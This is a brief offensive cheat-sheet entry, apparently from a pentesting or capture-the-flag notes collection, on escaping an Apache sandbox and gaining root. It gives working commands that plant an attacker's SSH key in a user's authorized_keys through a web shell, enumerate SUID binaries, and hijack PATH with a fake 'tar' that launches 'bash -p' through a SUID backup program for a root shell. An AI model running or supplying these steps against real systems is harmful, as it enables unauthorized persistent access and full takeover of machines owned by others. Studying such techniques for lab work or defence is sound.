# SUID Binary PATH Hijack via SSH Tunnel (Apache Sandbox Bypass)

Some systems have Apache `mod_security` or process sandbox that blocks SUID execution for processes descending from Apache (web shell). Get a real SSH session first, then exploit SUID.

```bash
# Get SSH access (e.g. write your pub key to user's authorized_keys via web shell)
# From web shell:
echo '<PUB_KEY>' >> /home/<USER>/.ssh/authorized_keys
# Connect via SSH:
ssh <USER>@<TARGET>

# Now exploit SUID PATH hijack:
find / -perm -4000 -type f 2>/dev/null
# e.g. /usr/bin/pandora_backup calls 'tar' without full path

# Create malicious 'tar':
echo -e '#!/bin/bash\nbash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/bin/pandora_backup   # executes /tmp/tar as root → root shell
```
